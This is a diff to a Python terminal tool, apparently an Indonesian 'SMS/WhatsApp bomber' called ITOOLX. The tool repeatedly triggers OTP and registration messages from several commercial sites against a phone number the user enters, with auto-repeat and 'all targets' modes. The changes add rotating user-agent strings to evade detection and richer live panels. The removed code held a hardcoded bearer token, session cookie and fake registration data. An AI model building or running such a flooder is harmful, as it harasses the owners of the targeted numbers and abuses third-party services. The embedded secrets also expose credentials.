@@ -6,6 +6,8 @@ import json
 import time
 import sys
 import os
+import signal
+import random
 from datetime import datetime
 
 try:
@@ -15,6 +17,7 @@ try:
     from rich.prompt import Prompt
     from rich.align import Align
     from rich.live import Live
+    from rich.columns import Columns
     from rich import box
     from rich.rule import Rule
 except ImportError:
@@ -25,6 +28,7 @@ except ImportError:
     from rich.prompt import Prompt
     from rich.align import Align
     from rich.live import Live
+    from rich.columns import Columns
     from rich import box
     from rich.rule import Rule
 
@@ -37,18 +41,34 @@ console = Console()
 APIS = {
     1: {"name": "Bunda.co.id",  "desc": "SMS",       "tag": "BND",
         "cooldown": 180, "color": "bright_magenta", "method": "bunda"},
-    2: {"name": "OptikMelawai", "desc": "SMS Reg",   "tag": "OPT",
-        "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
-    3: {"name": "Paper.id SMS", "desc": "SMS",       "tag": "PPR",
+    2: {"name": "Paper.id SMS", "desc": "SMS",       "tag": "PPR",
         "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
-    4: {"name": "PlanetBan",    "desc": "WhatsApp",  "tag": "PLB",
+    3: {"name": "PlanetBan",    "desc": "WhatsApp",  "tag": "PLB",
         "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
-    5: {"name": "ALL TARGETS",  "desc": "Semua API", "tag": "ALL",
+    4: {"name": "ALL TARGETS",  "desc": "Semua API", "tag": "ALL",
         "cooldown": 0,   "color": "bold cyan",      "method": "all"},
 }
 
-UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
-      "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36")
+UA_POOL = [
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.0.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+]
+
+def rand_ua() -> str:
+    return random.choice(UA_POOL)
 
 BANNER = """\
 [bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
@@ -103,18 +123,27 @@ def validate_phone(raw: str) -> str:
     return p
 
 def status_fmt(code: int):
-    """Return (label, color)."""
     if is_ok(code):  return "SUCCESS", "bold green"
     if code == 0:    return "ERROR",   "bold red"
     return f"HTTP {code}", "bold yellow"
+
+def clean_exit():
+    clr()
+    console.print(Align.center(Panel(
+        "[bold white]Sampai jumpa.[/bold white]\n"
+        "[dim]ITOOLX  Termux Edition[/dim]",
+        border_style="cyan", padding=(1, 4),
+    )))
+    sys.exit(0)
 
 # ══════════════════════════════════════════════════════════════
 #  API FUNCTIONS
 # ══════════════════════════════════════════════════════════════
 
 def _h(**extra) -> dict:
+    ua = rand_ua()
     base = {
-        "User-Agent": UA,
+        "User-Agent": ua,
         "Accept": "application/json, text/plain, */*",
         "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
         "sec-ch-ua-platform": '"Android"',
@@ -134,26 +163,6 @@ def send_bunda(phone: str) -> dict:
                 "origin": "https://www.bunda.co.id",
                 "x-requested-with": "com.chimbori.hermitcrab",
                 "referer": "https://www.bunda.co.id/id/hospitals",
-            }), timeout=15)
-        return {"status": r.status_code, "body": r.text}
-    except Exception as e:
-        return {"status": 0, "body": str(e)}
-
-def send_optik(phone: str) -> dict:
-    try:
-        r = requests.post(
-            "https://api.optikmelawai.com/api/v3/auth/register/1",
-            files=[("name",(None,"Jonuis Dane")),("sex",(None,"1")),
-                   ("birth_date",(None,"1995-07-28")),("mobile_number",(None,phone)),
-                   ("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))],
-            headers=_h(**{
-                "language": "id",
-                "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
-                "x-unique-user": "GA1.1.883509241.1785170487",
-                "origin": "https://optikmelawai.com",
-                "x-requested-with": "com.chimbori.hermitcrab",
-                "referer": "https://optikmelawai.com/",
-                "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
             }), timeout=15)
         return {"status": r.status_code, "body": r.text}
     except Exception as e:
@@ -195,7 +204,6 @@ def send_planetban(phone: str) -> dict:
 
 def dispatch(method: str, phone: str) -> dict:
     if method == "bunda":     return send_bunda(phone)
-    if method == "optik":     return send_optik(phone)
     if method == "paper_sms": return send_paper_sms(phone)
     if method == "planetban": return send_planetban(phone)
     return {}
@@ -222,10 +230,6 @@ def render_menu(phone: str = "") -> Table:
     for num, api in APIS.items():
         if api["method"] == "all":
             cd_txt = "[dim]each[/dim]"
-        elif phone:
-            rem    = get_rem(phone, api["method"], api["cooldown"])
-            cd_txt = (f"[bold red]{fmt_rem(rem)}[/bold red]"
-                      if rem > 0 else "[bold green]READY[/bold green]")
         else:
             cd_txt = f"[dim]{api['cooldown']}s[/dim]"
 
@@ -252,7 +256,7 @@ def print_home(phone: str = ""):
     console.print()
 
 # ══════════════════════════════════════════════════════════════
-#  LIVE COOLDOWN PANEL  (rebuilt every tick)
+#  LIVE COOLDOWN PANEL
 # ══════════════════════════════════════════════════════════════
 
 def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
@@ -260,11 +264,11 @@ def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
         box=box.SIMPLE, show_header=True, show_lines=False,
         padding=(0, 1), header_style="dim",
     )
-    t.add_column("API",    width=16)
+    t.add_column("API",      width=16)
     t.add_column("Progress", width=16)
-    t.add_column("Sisa",   width=8,  justify="right")
-    t.add_column("Unlock", width=9,  justify="center")
-    t.add_column("Status", width=7,  justify="center")
+    t.add_column("Sisa",     width=8,  justify="right")
+    t.add_column("Unlock",   width=9,  justify="center")
+    t.add_column("Status",   width=7,  justify="center")
 
     for api in targets:
         if api["method"] == "all":
@@ -297,11 +301,10 @@ def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
                  border_style="yellow", padding=(0, 1))
 
 # ══════════════════════════════════════════════════════════════
-#  LIVE CD WAIT  —  auto-muncul setelah result, blokir sampai ready
+#  LIVE CD WAIT
 # ══════════════════════════════════════════════════════════════
 
 def wait_until_ready(phone: str, targets: list):
-    """Tampil live CD sampai semua targets READY. Otomatis, tanpa prompt."""
     def any_locked():
         return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                    for a in targets if a["method"] != "all")
@@ -309,20 +312,17 @@ def wait_until_ready(phone: str, targets: list):
     if not any_locked():
         return
 
-    try:
-        with Live(build_cd_panel(phone, targets),
-                  console=console, refresh_per_second=2,
-                  transient=True) as live:
-            while any_locked():
-                time.sleep(0.5)
-                live.update(build_cd_panel(phone, targets))
-    except KeyboardInterrupt:
-        raise
+    with Live(build_cd_panel(phone, targets),
+              console=console, refresh_per_second=2,
+              transient=True) as live:
+        while any_locked():
+            time.sleep(0.5)
+            live.update(build_cd_panel(phone, targets))
 
     flush_stdin()
 
 # ══════════════════════════════════════════════════════════════
-#  Y / R / N  PROMPT  (muncul hanya setelah CD selesai)
+#  Y / R / N  PROMPT
 # ══════════════════════════════════════════════════════════════
 
 def ask_yrn() -> str:
@@ -335,14 +335,10 @@ def ask_yrn() -> str:
         border_style="green", padding=(0, 2),
     ))
     while True:
-        try:
-            flush_stdin()
-            raw = Prompt.ask("[bold cyan]  >[/bold cyan]",
-                             default="y").strip().lower()
-            if raw in ("y", "r", "n"):
-                return raw
-        except (KeyboardInterrupt, EOFError):
-            return "n"
+        flush_stdin()
+        raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
+        if raw in ("y", "r", "n"):
+            return raw
 
 # ══════════════════════════════════════════════════════════════
 #  RESULT PANELS
@@ -394,15 +390,65 @@ def show_all_results(phone: str, results: list, round_n: int):
     console.print(Align.center(t))
     console.print()
 
+# ══════════════════════════════════════════════════════════════
+#  R-MODE LIVE PANEL  —  in-place, tidak scroll
+# ══════════════════════════════════════════════════════════════
 
-def compact_result_line(api: dict, res: dict, round_n: int) -> str:
-    lbl, col = status_fmt(res.get("status", 0))
-    ts       = datetime.now().strftime("%H:%M:%S")
-    return (
-        f"  [{api['color']}]{api['tag']}  {api['name']:<14}[/{api['color']}]"
-        f"  [{col}]{lbl:<10}[/{col}]"
-        f"  [dim]#{round_n}  {ts}[/dim]"
-    )
+def build_r_panel(phone: str, targets: list, log_rows: list, title: str) -> Panel:
+    # ── tabel log kiriman (maks 12 baris terakhir)
+    tlog = Table(box=box.SIMPLE, show_header=True, padding=(0, 1),
+                 header_style="dim cyan", show_lines=False)
+    tlog.add_column("#",      width=3,  justify="right")
+    tlog.add_column("Tag",    width=5,  justify="center")
+    tlog.add_column("API",    width=14)
+    tlog.add_column("Status", width=10)
+    tlog.add_column("Jam",    width=9,  justify="center")
+
+    for row in log_rows[-12:]:
+        lbl, col = status_fmt(row["status"])
+        tlog.add_row(
+            f"[dim]{row['round']}[/dim]",
+            f"[{row['color']}]{row['tag']}[/{row['color']}]",
+            f"[{row['color']}]{row['name']}[/{row['color']}]",
+            f"[{col}]{lbl}[/{col}]",
+            f"[dim]{row['time']}[/dim]",
+        )
+
+    # ── tabel CD bar
+    tcd = Table(box=box.SIMPLE, show_header=False, padding=(0, 1),
+                show_lines=False)
+    tcd.add_column("API",    width=14)
+    tcd.add_column("Bar",    width=16)
+    tcd.add_column("Sisa",   width=8, justify="right")
+    tcd.add_column("Status", width=7, justify="center")
+
+    for api in targets:
+        if api["method"] == "all":
+            continue
+        rem  = get_rem(phone, api["method"], api["cooldown"])
+        sent = cooldown_tracker.get(phone, {}).get(api["method"])
+        cd   = api["cooldown"]
+
+        if rem > 0 and sent:
+            fill = max(0, int((cd - rem) / cd * 14))
+            bar  = f"[cyan]{'|'*fill}[/cyan][dim]{'.'*(14-fill)}[/dim]"
+            sisa = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
+            stat = "[red]WAIT[/red]"
+        else:
+            bar  = "[bold green]" + "|" * 14 + "[/bold green]"
+            sisa = "[bold green]  0s[/bold green]"
+            stat = "[bold green]READY[/bold green]"
+
+        tcd.add_row(
+            f"[{api['color']}]{api['name']}[/{api['color']}]",
+            bar, sisa, stat,
+        )
+
+    now  = datetime.now().strftime("%H:%M:%S")
+    body = Columns([tlog, tcd], padding=(0, 2))
+    return Panel(body, title=title,
+                 subtitle=f"[dim]{now}   Ctrl+C = stop[/dim]",
+                 border_style="yellow", padding=(0, 1))
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — SINGLE  (Y mode)
@@ -412,67 +458,57 @@ def session_single(api: dict, phone: str):
     round_n = 0
 
     while True:
-        # Kirim
         round_n += 1
         with console.status(
-            f"[bold cyan]Mengirim  {api['name']}...",
-            spinner="dots",
+            f"[bold cyan]Mengirim  {api['name']}...", spinner="dots",
         ):
             res = dispatch(api["method"], phone)
         set_cd(phone, api["method"])
 
-        # Tampil result
         show_result(api, phone, res, round_n)
 
-        # CD langsung muncul otomatis setelah result
-        try:
-            wait_until_ready(phone, [api])
-        except KeyboardInterrupt:
-            console.print("\n[bold red]  Stop.[/bold red]")
-            return
+        wait_until_ready(phone, [api])
 
-        # CD selesai -> tanya Y/R/N
         ans = ask_yrn()
         if ans == "n":
             return
         if ans == "r":
             session_single_r(api, phone, round_n)
             return
-        # y: kirim lagi langsung (CD sudah habis)
 
 # ══════════════════════════════════════════════════════════════
-#  SESSION — SINGLE  (R mode)
+#  SESSION — SINGLE  (R mode)  — in-place Live
 # ══════════════════════════════════════════════════════════════
 
 def session_single_r(api: dict, phone: str, start_round: int):
-    round_n = start_round
-    console.print(Panel(
-        "[dim]Auto-repeat aktif.  Ctrl+C untuk stop.[/dim]",
-        border_style="dim", padding=(0, 2),
-    ))
-    time.sleep(0.4)
+    round_n  = start_round
+    log_rows = []
+    title    = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"
 
-    while True:
-        # CD sudah habis (masuk sini setelah wait_until_ready dari session_single)
-        round_n += 1
-        with console.status(
-            f"[bold cyan]Auto  {api['name']}...",
-            spinner="dots",
-        ):
-            res = dispatch(api["method"], phone)
-        set_cd(phone, api["method"])
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        while True:
+            round_n += 1
+            live.stop()
+            with console.status(
+                f"[bold cyan]Auto  {api['name']}  #{round_n}...", spinner="dots",
+            ):
+                res = dispatch(api["method"], phone)
+            set_cd(phone, api["method"])
+            live.start()
 
-        # Tampil result
-        show_result(api, phone, res, round_n)
+            log_rows.append({
+                "round":  round_n,
+                "tag":    api["tag"],
+                "color":  api["color"],
+                "name":   api["name"],
+                "status": res.get("status", 0),
+                "time":   datetime.now().strftime("%H:%M:%S"),
+            })
+            live.update(build_r_panel(phone, [api], log_rows, title))
 
-        # CD muncul otomatis
-        try:
-            wait_until_ready(phone, [api])
-        except KeyboardInterrupt:
-            flush_stdin()
-            console.print("\n[bold red]  Auto-repeat dihentikan.[/bold red]")
-            return
-        # CD habis -> auto-kirim lagi (loop)
+            while get_rem(phone, api["method"], api["cooldown"]) > 0:
+                time.sleep(0.25)
+                live.update(build_r_panel(phone, [api], log_rows, title))
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — ALL  (Y mode)
@@ -484,13 +520,10 @@ def session_all(phone: str):
 
     while True:
         round_n += 1
-
-        # Kirim semua
         results = []
         for api in targets:
             with console.status(
-                f"[bold cyan]->  {api['name']}...",
-                spinner="aesthetic",
+                f"[bold cyan]->  {api['name']}...", spinner="aesthetic",
             ):
                 t_str = datetime.now().strftime("%H:%M:%S")
                 res   = dispatch(api["method"], phone)
@@ -502,41 +535,27 @@ def session_all(phone: str):
             })
             time.sleep(0.15)
 
-        # Tampil result semua
         show_all_results(phone, results, round_n)
 
-        # CD muncul otomatis setelah result
-        try:
-            wait_until_ready(phone, targets)
-        except KeyboardInterrupt:
-            console.print("\n[bold red]  Stop.[/bold red]")
-            return
+        wait_until_ready(phone, targets)
 
-        # CD selesai -> tanya Y/R/N
         ans = ask_yrn()
         if ans == "n":
             return
         if ans == "r":
             session_all_r(phone, targets, round_n)
             return
-        # y: kirim lagi
 
 # ══════════════════════════════════════════════════════════════
-#  SESSION — ALL  (R mode: kirim tiap target begitu CD-nya habis)
+#  SESSION — ALL  (R mode)  — in-place Live
 # ══════════════════════════════════════════════════════════════
 
 def session_all_r(phone: str, targets: list, initial_round: int = 0):
     round_counts = {a["method"]: initial_round for a in targets}
     pending: set = {a["method"] for a in targets
                     if not was_sent(phone, a["method"])}
-
-    console.print(Panel(
-        "[dim]Auto-repeat ALL aktif.\n"
-        "Setiap target langsung dikirim begitu CD-nya habis.\n"
-        "Ctrl+C untuk stop.[/dim]",
-        border_style="dim", padding=(0, 2),
-    ))
-    time.sleep(0.4)
+    log_rows: list = []
+    title = f"[bold yellow]AUTO-REPEAT  ALL  {phone}[/bold yellow]"
 
     def needs_send(api: dict) -> bool:
         if api["method"] in pending:
@@ -544,7 +563,7 @@ def session_all_r(phone: str, targets: list, initial_round: int = 0):
         return (was_sent(phone, api["method"]) and
                 get_rem(phone, api["method"], api["cooldown"]) == 0)
 
-    try:
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
         while True:
             ready = [a for a in targets if needs_send(a)]
 
@@ -553,41 +572,27 @@ def session_all_r(phone: str, targets: list, initial_round: int = 0):
                     pending.discard(api["method"])
                     round_counts[api["method"]] += 1
                     rn = round_counts[api["method"]]
+
+                    live.stop()
                     with console.status(
-                        f"[bold cyan]->  {api['name']}  #{rn}",
-                        spinner="dots",
+                        f"[bold cyan]->  {api['name']}  #{rn}", spinner="dots",
                     ):
                         res = dispatch(api["method"], phone)
                     set_cd(phone, api["method"])
-                    console.print(compact_result_line(api, res, rn))
+                    live.start()
+
+                    log_rows.append({
+                        "round":  rn,
+                        "tag":    api["tag"],
+                        "color":  api["color"],
+                        "name":   api["name"],
+                        "status": res.get("status", 0),
+                        "time":   datetime.now().strftime("%H:%M:%S"),
+                    })
                     time.sleep(0.1)
 
-            # Live CD refresh (0.5s window, keluar lebih cepat kalau ada yg ready)
-            try:
-                with Live(
-                    build_cd_panel(
-                        phone, targets,
-                        title=f"[bold yellow]AUTO-REPEAT   {phone}[/bold yellow]",
-                    ),
-                    console=console, refresh_per_second=4,
-                    transient=True,
-                ) as live:
-                    elapsed = 0.0
-                    while elapsed < 1.0:
-                        time.sleep(0.25)
-                        elapsed += 0.25
-                        live.update(build_cd_panel(
-                            phone, targets,
-                            title=f"[bold yellow]AUTO-REPEAT   {phone}[/bold yellow]",
-                        ))
-                        if any(needs_send(a) for a in targets):
-                            break
-            except KeyboardInterrupt:
-                raise
-
-    except KeyboardInterrupt:
-        flush_stdin()
-        console.print("\n[bold red]  Auto-repeat dihentikan.[/bold red]")
+            live.update(build_r_panel(phone, targets, log_rows, title))
+            time.sleep(0.25)
 
 # ══════════════════════════════════════════════════════════════
 #  INPUT HELPER
@@ -597,46 +602,38 @@ def ask_phone(current: str = "") -> str:
     hint = (f" [dim](Enter = {current})[/dim]"
             if current else " [dim](08xxx / 628xxx)[/dim]")
     while True:
-        try:
-            flush_stdin()
-            raw = Prompt.ask(f"[bold cyan]  >[/bold cyan] Nomor{hint}")
-            if raw.strip() == "" and current:
-                return current
-            p = validate_phone(raw)
-            if len(p) >= 10:
-                return p
-            console.print("[bold red]  Nomor tidak valid.[/bold red]")
-        except (KeyboardInterrupt, EOFError):
-            console.print()
-            sys.exit(0)
+        flush_stdin()
+        raw = Prompt.ask(f"[bold cyan]  >[/bold cyan] Nomor{hint}")
+        if raw.strip() == "" and current:
+            return current
+        p = validate_phone(raw)
+        if len(p) >= 10:
+            return p
+        console.print("[bold red]  Nomor tidak valid.[/bold red]")
 
 # ══════════════════════════════════════════════════════════════
 #  MAIN
 # ══════════════════════════════════════════════════════════════
 
 def main():
+    # Ctrl+C sekali = langsung keluar bersih, tanpa loop balik ke menu
+    signal.signal(signal.SIGINT, lambda sig, frm: clean_exit())
+
     current_phone = ""
 
     while True:
         print_home(current_phone)
 
-        # Pilih target
         try:
             flush_stdin()
             raw    = Prompt.ask("[bold cyan]  >[/bold cyan] Pilih  [dim](0 = exit)[/dim]")
             choice = int(raw.strip())
-        except (ValueError, KeyboardInterrupt, EOFError):
+        except (ValueError, EOFError):
             time.sleep(0.3)
             continue
 
         if choice == 0:
-            clr()
-            console.print(Align.center(Panel(
-                "[bold white]Sampai jumpa.[/bold white]\n"
-                "[dim]ITOOLX  Termux Edition[/dim]",
-                border_style="cyan", padding=(1, 4),
-            )))
-            sys.exit(0)
+            clean_exit()
 
         if choice not in APIS:
             time.sleep(0.3)
@@ -654,7 +651,7 @@ def main():
         current_phone = ask_phone(current_phone)
         console.print()
 
-        # Cek CD awal — kalau ada yang locked, tampil CD dulu, tanya Y/N
+        # Cek CD awal
         targets = ([v for v in APIS.values() if v["method"] != "all"]
                    if api["method"] == "all" else [api])
 
@@ -670,31 +667,20 @@ def main():
                 "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu kirim"
                 "\n  [bold cyan]N[/bold cyan] = Batal\n"
             )
-            try:
-                flush_stdin()
-                ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
-                                 default="y").strip().lower()
-            except (KeyboardInterrupt, EOFError):
-                ans = "n"
+            flush_stdin()
+            ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
+                             default="y").strip().lower()
             if ans != "y":
                 continue
-            # Tunggu CD dulu
-            try:
-                wait_until_ready(current_phone, targets)
-            except KeyboardInterrupt:
-                continue
+            wait_until_ready(current_phone, targets)
 
         # Mulai sesi
-        try:
-            if api["method"] == "all":
-                session_all(current_phone)
-            else:
-                session_single(api, current_phone)
-        except KeyboardInterrupt:
-            console.print("\n[bold red]  Dihentikan.[/bold red]")
-            time.sleep(0.6)
+        if api["method"] == "all":
+            session_all(current_phone)
+        else:
+            session_single(api, current_phone)
 
-        time.sleep(0.6)
+        time.sleep(0.4)
 
 
 if __name__ == "__main__":
